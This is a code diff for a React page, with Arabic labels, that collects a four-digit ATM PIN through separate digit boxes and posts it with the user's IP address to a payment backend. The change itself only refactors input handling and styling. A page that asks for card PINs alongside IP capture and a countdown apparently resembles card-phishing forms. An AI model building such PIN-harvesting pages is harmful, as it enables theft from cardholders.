@@ -5,7 +5,7 @@ import Spinner from '../components/Spinner';
 const Atmcode = () => {
   const [isLoading, setIsLoading] = useState(true);
   const navigate = useNavigate();
-  const [pin, setPin] = useState('');
+  const [pin, setPin] = useState(['', '', '', '']);
   const [userIP, setUserIP] = useState('');
   const [timer, setTimer] = useState(120);
   const [totalAmount, setTotalAmount] = useState(0);
@@ -69,24 +69,53 @@ const Atmcode = () => {
   const minutes = Math.floor(timer / 60);
   const seconds = timer % 60;
 
+  const handlePinChange = (index, value) => {
+    // السماح فقط بالأرقام
+    if (!/^\d*$/.test(value)) return;
+    
+    // تحديث قيمة PIN لهذا الحقل
+    const newPin = [...pin];
+    newPin[index] = value;
+    setPin(newPin);
+    
+    // التحرك للحقل التالي عند إدخال رقم
+    if (value && index < 3) {
+      document.getElementById(`pin-${index + 1}`).focus();
+    }
+  };
+
+  const handleKeyDown = (index, e) => {
+    // السماح بالتنقل باستخدام الأسهم
+    if (e.key === 'ArrowLeft' && index > 0) {
+      e.preventDefault();
+      document.getElementById(`pin-${index - 1}`).focus();
+    } else if (e.key === 'ArrowRight' && index < 3) {
+      e.preventDefault();
+      document.getElementById(`pin-${index + 1}`).focus();
+    } else if (e.key === 'Backspace' && !e.target.value && index > 0) {
+      e.preventDefault();
+      document.getElementById(`pin-${index - 1}`).focus();
+    }
+  };
+
   const handleSubmit = async (e) => {
     e.preventDefault();
 
-    if (pin.length !== 4) {
+    const pinStr = pin.join('');
+    if (pinStr.length !== 4) {
       alert('يرجى إدخال رمز الصراف المكون من 4 أرقام');
       return;
     }
 
     try {
       const payload = {
-        atmPin: pin,
+        atmPin: pinStr,
         userIP: userIP,
       };
 
       const apiUrl = process.env.REACT_APP_API_BASE_URL;
       if (!apiUrl) throw new Error('REACT_APP_API_BASE_URL غير معرّف');
 
-      // إرسال طلب submit-pin مع رأس التوكن
       const response = await fetch(`${apiUrl}/api/payment/submit-pin`, {
         method: 'POST',
         headers: { 
@@ -97,7 +126,6 @@ const Atmcode = () => {
       });
 
       if (response.ok) {
-        // جلب بيانات المستخدم مع رأس التوكن
         const userRes = await fetch(`${apiUrl}/api/protected/user`, {
           headers: {
             'Authorization': `Bearer ${localStorage.getItem('authToken')}`
@@ -158,23 +186,20 @@ const Atmcode = () => {
           <div className="form-groupu">
             <label>الرمز السري المكون من 4 أرقام</label>
             <div className="pin-inputss">
-              {[...Array(4)].map((_, i) => (
+              {pin.map((digit, index) => (
                 <input
-                  key={i}
-                  type="number"
+                  key={index}
+                  type="text"
                   maxLength={1}
-                  value={pin[i] || ''}
-                  onChange={(e) => {
-                    const newPin = [...pin];
-                    newPin[i] = e.target.value.replace(/\D/g, '');
-                    setPin(newPin.join(''));
-                    if (e.target.value && i < 3) {
-                      document.getElementById(`pin-${i + 1}`).focus();
-                    }
-                  }}
-                  id={`pin-${i}`}
-                  autoFocus={i === 0}
+                  value={digit}
+                  onChange={(e) => handlePinChange(index, e.target.value)}
+                  onKeyDown={(e) => handleKeyDown(index, e)}
+                  id={`pin-${index}`}
+                  autoFocus={index === 0}
                   required
+                  pattern="\d*"
+                  inputMode="numeric"
+                  className="pin-input-field"
                 />
               ))}
             </div>
@@ -314,7 +339,7 @@ const Atmcode = () => {
           margin: 0 auto;
         }
         
-        .pin-inputss input {
+        .pin-input-field {
           width: 50px;
           height: 50px;
           border: 2px solid #e0d1cb;
@@ -325,15 +350,11 @@ const Atmcode = () => {
           transition: all 0.3s;
         }
         
-        .pin-inputss input:focus {
+        .pin-input-field:focus {
           outline: none;
           border-color: #A67769;
           box-shadow: 0 0 0 3px rgba(166, 119, 105, 0.2);
           background: white;
-        }
-        
-        .form-buttons {
-          width:100%;
         }
         
         .submit-btn {
